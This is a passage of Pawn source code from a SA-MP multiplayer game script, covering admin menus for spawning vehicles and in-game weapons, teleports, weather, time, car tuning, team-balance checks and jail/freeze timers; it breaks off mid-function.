            case 10: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}//-------------------------------------------------------------------------
	if(Current==LVehicles){
		switch(row){
			case 0: ChangeMenu(playerid,Current,twodoor);
			case 1: ChangeMenu(playerid,Current,fourdoor);
			case 2: ChangeMenu(playerid,Current,fastcar);
			case 3: ChangeMenu(playerid,Current,Othercars);
			case 4: ChangeMenu(playerid,Current,bikes);
			case 5: ChangeMenu(playerid,Current,boats);
			case 6: ChangeMenu(playerid,Current,planes);
			case 7: ChangeMenu(playerid,Current,helicopters);
			case 8: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return 1;
	}
	if(Current==twodoor){
		new vehid;
		switch(row){
			case 0: vehid = 533;
			case 1: vehid = 439;
			case 2: vehid = 555;
			case 3: vehid = 422;
			case 4: vehid = 554;
			case 5: vehid = 575;
			case 6: vehid = 536;
			case 7: vehid = 535;
			case 8: vehid = 576;
			case 9: vehid = 401;
			case 10: vehid = 526;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==fourdoor){
		new vehid;
		switch(row){
			case 0: vehid = 404;
			case 1: vehid = 566;
			case 2: vehid = 412;
			case 3: vehid = 445;
			case 4: vehid = 507;
			case 5: vehid = 466;
			case 6: vehid = 546;
			case 7: vehid = 511;
			case 8: vehid = 467;
			case 9: vehid = 426;
			case 10: vehid = 405;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==fastcar){
		new vehid;
		switch(row){
			case 0: vehid = 480;
			case 1: vehid = 402;
			case 2: vehid = 415;
			case 3: vehid = 587;
			case 4: vehid = 494;
			case 5: vehid = 411;
			case 6: vehid = 603;
			case 7: vehid = 506;
			case 8: vehid = 451;
			case 9: vehid = 477;
			case 10: vehid = 541;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==Othercars){
		new vehid;
		switch(row){
			case 0: vehid = 556;
			case 1: vehid = 408;
			case 2: vehid = 431;
			case 3: vehid = 437;
			case 4: vehid = 427;
			case 5: vehid = 432;
			case 6: vehid = 601;
			case 7: vehid = 524;
			case 8: vehid = 455;
			case 9: vehid = 424;
			case 10: vehid = 573;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==bikes){
		new vehid;
		switch(row){
			case 0: vehid = 581;
			case 1: vehid = 481;
			case 2: vehid = 462;
			case 3: vehid = 521;
			case 4: vehid = 463;
			case 5: vehid = 522;
			case 6: vehid = 461;
			case 7: vehid = 448;
			case 8: vehid = 471;
			case 9: vehid = 468;
			case 10: vehid = 586;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==boats){
		new vehid;
		switch(row){
			case 0: vehid = 472;
			case 1: vehid = 473;
			case 2: vehid = 493;
			case 3: vehid = 595;
			case 4: vehid = 484;
			case 5: vehid = 430;
			case 6: vehid = 453;
			case 7: vehid = 452;
			case 8: vehid = 446;
			case 9: vehid = 454;
			case 10: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==planes){
		new vehid;
		switch(row){
			case 0: vehid = 592;
			case 1: vehid = 577;
			case 2: vehid = 511;
			case 3: vehid = 512;
			case 4: vehid = 593;
			case 5: vehid = 520;
			case 6: vehid = 553;
			case 7: vehid = 476;
			case 8: vehid = 519;
			case 9: vehid = 460;
			case 10: vehid = 513;
			case 11: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}
	if(Current==helicopters){
		new vehid;
		switch(row){
			case 0: vehid = 548;
			case 1: vehid = 425;
			case 2: vehid = 417;
			case 3: vehid = 487;
			case 4: vehid = 488;
			case 5: vehid = 497;
			case 6: vehid = 563;
			case 7: vehid = 447;
			case 8: vehid = 469;
			case 9: return ChangeMenu(playerid,Current,LVehicles);
		}
		return SelectCar(playerid,vehid,Current);
	}

	if(Current==XWeapons){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,24,500); }
			case 1: { GivePlayerWeapon(playerid,31,500); }
			case 2: { GivePlayerWeapon(playerid,26,500); }
			case 3: { GivePlayerWeapon(playerid,27,500); }
			case 4: { GivePlayerWeapon(playerid,28,500); }
			case 5: { GivePlayerWeapon(playerid,35,500); }
			case 6: { GivePlayerWeapon(playerid,38,1000); }
			case 7: { GivePlayerWeapon(playerid,34,500); }
			case 8: return ChangeMenu(playerid,Current,XWeaponsBig);
        	case 9: return ChangeMenu(playerid,Current,XWeaponsSmall);
        	case 10: return ChangeMenu(playerid,Current,XWeaponsMore);
        	case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsBig){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,25,500);  }
			case 1: { GivePlayerWeapon(playerid,30,500); }
			case 2: { GivePlayerWeapon(playerid,33,500); }
			case 3: { GivePlayerWeapon(playerid,36,500); }
			case 4: { GivePlayerWeapon(playerid,37,500); }
			case 5: { GivePlayerWeapon(playerid,29,500); }
			case 6: { GivePlayerWeapon(playerid,32,1000); }
			case 7: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsSmall){
		switch(row){
			case 0: { GivePlayerWeapon(playerid,22,500); }//9mm
			case 1: { GivePlayerWeapon(playerid,23,500); }//s9
			case 2: { GivePlayerWeapon(playerid,18,500); }// MC
			case 3: { GivePlayerWeapon(playerid,42,500); }//FE
			case 4: { GivePlayerWeapon(playerid,41,500); }//spraycan
			case 5: { GivePlayerWeapon(playerid,16,500); }//grenade
			case 6: { GivePlayerWeapon(playerid,8,500); }//Katana
			case 7: { GivePlayerWeapon(playerid,9,1000); }//chainsaw
			case 8: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

	if(Current==XWeaponsMore){
		switch(row){
			case 0: SetPlayerSpecialAction(playerid, 2);
			case 1: GivePlayerWeapon(playerid,4,500);
			case 2: GivePlayerWeapon(playerid,14,500);
			case 3: GivePlayerWeapon(playerid,43,500);
			case 4: GivePlayerWeapon(playerid,7,500);
			case 5: GivePlayerWeapon(playerid,5,500);
			case 6: GivePlayerWeapon(playerid,2,1000);
			case 7: MaxAmmo(playerid);
			case 8: return ChangeMenu(playerid,Current,XWeapons);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LTele)
	{
        switch(row)
		{
			case 0: ChangeMenu(playerid,Current,LasVenturasMenu);
			case 1: ChangeMenu(playerid,Current,LosSantosMenu);
			case 2: ChangeMenu(playerid,Current,SanFierroMenu);
			case 3: ChangeMenu(playerid,Current,DesertMenu);
			case 4: ChangeMenu(playerid,Current,FlintMenu);
			case 5: ChangeMenu(playerid,Current,MountChiliadMenu);
			case 6: ChangeMenu(playerid,Current,InteriorsMenu);
			case 7: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return 1;
	}

    if(Current == LasVenturasMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,2037.0,1343.0,12.0); SetPlayerInterior(playerid,0); }// strip
			case 1: { SetPlayerPos(playerid,2163.0,1121.0,23); SetPlayerInterior(playerid,0); }// come a lot
			case 2: { SetPlayerPos(playerid,1688.0,1615.0,12.0); SetPlayerInterior(playerid,0); }// lv airport
			case 3: { SetPlayerPos(playerid,2503.0,2764.0,10.0); SetPlayerInterior(playerid,0); }// military fuel
			case 4: { SetPlayerPos(playerid,1418.0,2733.0,10.0); SetPlayerInterior(playerid,0); }// golf lv
			case 5: { SetPlayerPos(playerid,1377.0,2196.0,9.0); SetPlayerInterior(playerid,0); }// pitch match
			case 6: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LosSantosMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,2495.0,-1688.0,13.0); SetPlayerInterior(playerid,0); }// ganton
			case 1: { SetPlayerPos(playerid,1979.0,-2241.0,13.0); SetPlayerInterior(playerid,0); }// ls airport
			case 2: { SetPlayerPos(playerid,2744.0,-2435.0,15.0); SetPlayerInterior(playerid,0); }// docks
			case 3: { SetPlayerPos(playerid,1481.0,-1656.0,14.0); SetPlayerInterior(playerid,0); }// square
			case 4: { SetPlayerPos(playerid,1150.0,-2037.0,69.0); SetPlayerInterior(playerid,0); }// veradant bluffs
			case 5: { SetPlayerPos(playerid,425.0,-1815.0,6.0); SetPlayerInterior(playerid,0); }// santa beach
			case 6: { SetPlayerPos(playerid,1240.0,-744.0,95.0); SetPlayerInterior(playerid,0); }// mullholland
			case 7: { SetPlayerPos(playerid,679.0,-1070.0,49.0); SetPlayerInterior(playerid,0); }// richman
			case 8: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == SanFierroMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-1990.0,137.0,27.0); SetPlayerInterior(playerid,0); } // sf station
			case 1: { SetPlayerPos(playerid,-1528.0,-206.0,14.0); SetPlayerInterior(playerid,0); }// sf airport
			case 2: { SetPlayerPos(playerid,-2709.0,198.0,4.0); SetPlayerInterior(playerid,0); }// ocean flats
			case 3: { SetPlayerPos(playerid,-2738.0,-295.0,6.0); SetPlayerInterior(playerid,0); }// avispa country club
			case 4: { SetPlayerPos(playerid,-1457.0,465.0,7.0); SetPlayerInterior(playerid,0); }// easter basic docks
			case 5: { SetPlayerPos(playerid,-1853.0,1404.0,7.0); SetPlayerInterior(playerid,0); }// esplanadae north
			case 6: { SetPlayerPos(playerid,-2620.0,1373.0,7.0); SetPlayerInterior(playerid,0); }// battery point
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == DesertMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,416.0,2516.0,16.0); SetPlayerInterior(playerid,0); } // plane graveyard
			case 1: { SetPlayerPos(playerid,81.0,1920.0,17.0); SetPlayerInterior(playerid,0); }// area51
			case 2: { SetPlayerPos(playerid,-324.0,1516.0,75.0); SetPlayerInterior(playerid,0); }// big ear
			case 3: { SetPlayerPos(playerid,-640.0,2051.0,60.0); SetPlayerInterior(playerid,0); }// dam
			case 4: { SetPlayerPos(playerid,-766.0,1545.0,27.0); SetPlayerInterior(playerid,0); }// las barrancas
			case 5: { SetPlayerPos(playerid,-1514.0,2597.0,55.0); SetPlayerInterior(playerid,0); }// el qyebrados
			case 6: { SetPlayerPos(playerid,442.0,1427.0,9.0); SetPlayerInterior(playerid,0); }// actane springs
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == FlintMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-849.0,-1940.0,13.0);  SetPlayerInterior(playerid,0); }// lake
			case 1: { SetPlayerPos(playerid,-1107.0,-1619.0,76.0);  SetPlayerInterior(playerid,0); }// leafy hollow
			case 2: { SetPlayerPos(playerid,-1049.0,-1199.0,128.0);  SetPlayerInterior(playerid,0); }// the farm
			case 3: { SetPlayerPos(playerid,-1655.0,-2219.0,32.0);  SetPlayerInterior(playerid,0); }// shady cabin
			case 4: { SetPlayerPos(playerid,-375.0,-1441.0,25.0); SetPlayerInterior(playerid,0); }// flint range
			case 5: { SetPlayerPos(playerid,-367.0,-1049.0,59.0); SetPlayerInterior(playerid,0); }// beacon hill
			case 6: { SetPlayerPos(playerid,-494.0,-555.0,25.0); SetPlayerInterior(playerid,0); }// fallen tree
			case 7: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == MountChiliadMenu)
	{
        switch(row)
		{
			case 0: { SetPlayerPos(playerid,-2308.0,-1657.0,483.0);  SetPlayerInterior(playerid,0); }// chiliad jump
			case 1: { SetPlayerPos(playerid,-2331.0,-2180.0,35.0); SetPlayerInterior(playerid,0); }// bottom chiliad
			case 2: { SetPlayerPos(playerid,-2431.0,-1620.0,526.0);  SetPlayerInterior(playerid,0); }// highest point
			case 3: { SetPlayerPos(playerid,-2136.0,-1775.0,208.0);  SetPlayerInterior(playerid,0); }// chiliad path
			case 4: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == InteriorsMenu)
	{
        switch(row)
		{
			case 0: {	SetPlayerPos(playerid,386.5259, 173.6381, 1008.3828);	SetPlayerInterior(playerid,3); }
			case 1: {	SetPlayerPos(playerid,288.4723, 170.0647, 1007.1794);	SetPlayerInterior(playerid,3); }
			case 2: {	SetPlayerPos(playerid,372.5565, -131.3607, 1001.4922);	SetPlayerInterior(playerid,5); }
			case 3: {	SetPlayerPos(playerid,-1129.8909, 1057.5424, 1346.4141);	SetPlayerInterior(playerid,10); }
			case 4: {	SetPlayerPos(playerid,2233.9363, 1711.8038, 1011.6312);	SetPlayerInterior(playerid,1); }
			case 5: {	SetPlayerPos(playerid,2536.5322, -1294.8425, 1044.125);	SetPlayerInterior(playerid,2); }
			case 6: {	SetPlayerPos(playerid,1267.8407, -776.9587, 1091.9063);	SetPlayerInterior(playerid,5); }
  			case 7: {	SetPlayerPos(playerid,-1421.5618, -663.8262, 1059.5569);	SetPlayerInterior(playerid,4); }
   			case 8: {	SetPlayerPos(playerid,-1401.067, 1265.3706, 1039.8672);	SetPlayerInterior(playerid,16); }
   			case 9: {	SetPlayerPos(playerid,285.8361, -39.0166, 1001.5156);	SetPlayerInterior(playerid,1); }
    		case 10: {	SetPlayerPos(playerid,1727.2853, -1642.9451, 20.2254);	SetPlayerInterior(playerid,18); }
			case 11: return ChangeMenu(playerid,Current,LTele);
		}
		return TogglePlayerControllable(playerid,true);
	}
    if(Current == LWeather)
	{
		new adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname));
        switch(row)
		{
			case 0:	{	SetWeather(5);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0);	CMDMessageToAdmins(playerid,"SETWEATHER"); format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
   			case 1:	{	SetWeather(19); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 2:	{	SetWeather(8);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 3:	{	SetWeather(20);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 4:	{	SetWeather(9);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 5:	{	SetWeather(16); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 6:	{	SetWeather(45); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{	SetWeather(44); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{	SetWeather(22); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 9:	{	SetWeather(11); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"SETWEATHER");	format(string,sizeof(string),"Administrator %s has changed the weather",adminname); SendClientMessageToAll(blue,string); }
			case 10: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LTuneMenu)
	{
        switch(row)
		{
			case 0:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1010); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
   			case 1:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1087); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added"); }
			case 2:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1081); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 3: {	AddVehicleComponent(GetPlayerVehicleID(playerid),1078); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 4:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1098); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 5:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1074); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 6:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1082); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 7:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1085); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 8:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1025); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 9:	{	AddVehicleComponent(GetPlayerVehicleID(playerid),1077); PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	SendClientMessage(playerid,blue,"Vehicle Component Added");	}
			case 10: return ChangeMenu(playerid,Current,PaintMenu);
			case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == PaintMenu)
	{
        switch(row)
		{
			case 0:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),0); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 1"); }
			case 1:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),1); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 2"); }
			case 2:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),2); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 3"); }
			case 3:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),3); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 4"); }
			case 4:	{ ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),4); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Changed To Paint Job 5"); }
			case 5:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),0,0); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 6:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),1,1); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To White"); }
			case 7:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),79,158); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 8:	{ ChangeVehicleColor(GetPlayerVehicleID(playerid),146,183); PlayerPlaySound(playerid,1133,0.0,0.0,0.0); SendClientMessage(playerid,blue,"Vehicle Paint Colour Changed To Black"); }
			case 9: return ChangeMenu(playerid,Current,LTuneMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}
    if(Current == LTime)
	{
		new adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname));
        switch(row)
		{
			case 0:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,7,0);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0);	CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
   			case 1:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,12,0); PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 2:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,16,0);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 3:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,20,0);	PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 4:	{ for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,0,0);  PlayerPlaySound(playerid,1057,0.0,0.0,0.0); CMDMessageToAdmins(playerid,"LTIME MENU");	format(string,sizeof(string),"Administrator %s has changed the time",adminname); SendClientMessageToAll(blue,string); }
			case 5: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return TogglePlayerControllable(playerid,true);
	}

    if(Current == LCars)
	{
		new vehid;
        switch(row) {
			case 0: vehid = 451;//Turismo
			case 1: vehid = 568;//Bandito
			case 2: vehid = 539;//Vortex
			case 3: vehid = 522;//nrg
			case 4: vehid = 601;//s.w.a.t
			case 5: vehid = 425; //hunter
			case 6: vehid = 493;//jetmax
			case 7: vehid = 432;//rhino
			case 8: vehid = 444; //mt
			case 9: vehid = 447; //sea sparrow
			case 10: return ChangeMenu(playerid,Current,LCars2);
			case 11: return ChangeMenu(playerid,Current,LMainMenu);
		}
		return SelectCar(playerid,vehid,Current);
	}

    if(Current == LCars2)
	{
		new vehid;
        switch(row) {
			case 0: vehid = 406;// dumper
			case 1: vehid = 564; //rc tank
			case 2: vehid = 441;//RC Bandit
			case 3: vehid = 464;// rc baron
			case 4: vehid = 501; //rc goblin
			case 5: vehid = 465; //rc raider
			case 6: vehid = 594; // rc cam
			case 7: vehid = 449; //tram
			case 8: return ChangeMenu(playerid,Current,LCars);
		}
		return SelectCar(playerid,vehid,Current);
	}

	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
   	if(PlayerInfo[playerid][LoggedIn] == 0 && PlayerInfo[playerid][Registered] == 1)
   	{
     	new str[128];
	 	format(str,sizeof(str),"Server: You are not registered yet.Pls /register <Password>",PlayerName2(playerid));
	 	SendClientMessage(playerid,red,str);
   	}
	new team1count = GetTeamCount(TEAM_PAKISTAN);
	new team2count = GetTeamCount(TEAM_USA);
	new team3count = GetTeamCount(TEAM_INDIA);
	new team4count = GetTeamCount(TEAM_CHINA);
	new team5count = GetTeamCount(TEAM_NEPAL);
	new team6count = GetTeamCount(TEAM_DUBAI);
	new team7count = GetTeamCount(TEAM_ML);
	switch(gTeam[playerid])
	{
		case TEAM_PAKISTAN:
		{
		    if(team1count > team7count && team6count && team5count && team4count && team3count && team2count)
			{
				SendClientMessage(playerid, red,"Pakistan team is full");
				return 0;
    		}
		}
		case TEAM_USA:
		{
		    if(team2count > team7count && team6count && team5count && team4count && team3count && team1count)
			{
				SendClientMessage(playerid, red,"USA team is full");
				return 0;
    		}
		}
		case TEAM_INDIA:
		{
		    if(team3count > team7count && team6count && team5count && team4count && team2count && team1count)
			{
				SendClientMessage(playerid, red,"India team is full");
				return 0;
    		}
		}
		case TEAM_CHINA:
		{
		    if(team4count > team7count && team6count && team5count && team3count && team2count && team1count)
			{
				SendClientMessage(playerid, red,"China team is full");
				return 0;
    		}
		}
		case TEAM_NEPAL:
		{
		    if(team5count > team7count && team6count && team4count && team3count && team2count && team1count)
			{
				SendClientMessage(playerid, red,"Nepal team is full");
				return 0;
    		}
		}
		case TEAM_DUBAI:
		{
		    if(team6count > team7count && team5count && team4count && team3count && team2count && team1count)
			{
				SendClientMessage(playerid, red,"Dubai team is full");
				return 0;
    		}
		}
		case TEAM_ML:
		{
		    if(team7count > team6count && team5count && team4count && team3count && team2count && team1count)
			{
				SendClientMessage(playerid, red,"Malaysia team is full");
				return 0;
    		}
		}
	}
   	return 1;
}
//==============================================================================

public OnPlayerExitedMenu(playerid)
{
    new Menu:Current = GetPlayerMenu(playerid);
    HideMenuForPlayer(Current,playerid);
    return TogglePlayerControllable(playerid,true);
}

//==============================================================================

ChangeMenu(playerid,Menu:oldmenu,Menu:newmenu)
{
	if(IsValidMenu(oldmenu)) {
		HideMenuForPlayer(oldmenu,playerid);
		ShowMenuForPlayer(newmenu,playerid);
	}
	return 1;
}

CloseMenu(playerid,Menu:oldmenu)
{
	HideMenuForPlayer(oldmenu,playerid);
	TogglePlayerControllable(playerid,1);
	return 1;
}
SelectCar(playerid,vehid,Menu:menu)
{
	CloseMenu(playerid,menu);
	SetCameraBehindPlayer(playerid);
	CarSpawner(playerid,vehid);
	return 1;
}
#endif

//==============================================================================


//==================== [ Jail & Freeze ]========================================

forward Jail1(player1);
public Jail1(player1)
{
	TogglePlayerControllable(player1,false);
	new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+10,y,z+10);SetPlayerCameraLookAt(player1,x,y,z);
	Jail2(player1);
}

forward Jail2(player1);
public Jail2(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+7,y,z+5); SetPlayerCameraLookAt(player1,x,y,z);
	if(GetPlayerState(player1) == PLAYER_STATE_ONFOOT) SetPlayerSpecialAction(player1,SPECIAL_ACTION_HANDSUP);
	GameTextForPlayer(player1,"~r~Busted By Admins",3000,3);
	Jail3(player1);
}

forward Jail3(player1);
public Jail3(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+3,y,z); SetPlayerCameraLookAt(player1,x,y,z);
}

forward JailPlayer(player1);
public JailPlayer(player1)
{
	TogglePlayerControllable(player1,true);
	SetPlayerPos(player1,197.6661,173.8179,1003.0234);
	SetPlayerInterior(player1,3);
	SetCameraBehindPlayer(player1);
	JailTimer[player1] = SetTimerEx("JailRelease",PlayerInfo[player1][JailTime],0,"d",player1);
	PlayerInfo[player1][Jailed] = 1;
}

forward JailRelease(player1);
public JailRelease(player1)
{
	KillTimer( JailTimer[player1] );
	PlayerInfo[player1][JailTime] = 0;  PlayerInfo[player1][Jailed] = 0;
	SetPlayerInterior(player1,0); SetPlayerPos(player1, 0.0, 0.0, 0.0); SpawnPlayer(player1);
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);

	GameTextForPlayer(player1,"~g~Released ~n~From Jail",3000,3);
}

//------------------------------------------------------------------------------
forward UnFreezeMe(player1);
public UnFreezeMe(player1)
{
	KillTimer( FreezeTimer[player1] );
	TogglePlayerControllable(player1,true);   PlayerInfo[player1][Frozen] = 0;
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);	GameTextForPlayer(player1,"~g~Unfrozen",3000,3);
}

//==============================================================================
forward RepairCar(playerid);
public RepairCar(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid),Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]+0.5);
	SetVehicleZAngle(GetPlayerVehicleID(playerid), Pos[playerid][3]);
	SetCameraBehindPlayer(playerid);
}

//============================ [ Timers ]=======================================
//==============================================================================
//==========================[ Server Info  ]====================================

forward ConnectedPlayers();
public ConnectedPlayers()
{
	new Connected;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) Connected++;
	return Connected;
}

forward JailedPlayers();
public JailedPlayers()
{
	new JailedCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed] == 1) JailedCount++;
	return JailedCount;
}

forward FrozenPlayers();
public FrozenPlayers()
{
	new FrozenCount; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Frozen] == 1) FrozenCount++;
	return FrozenCount;
}

forward MutedPlayers();
public MutedPlayers()
{
	new coun; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted] == 1) coun++;
	return coun;
}

forward InVehCount();
public InVehCount()
{
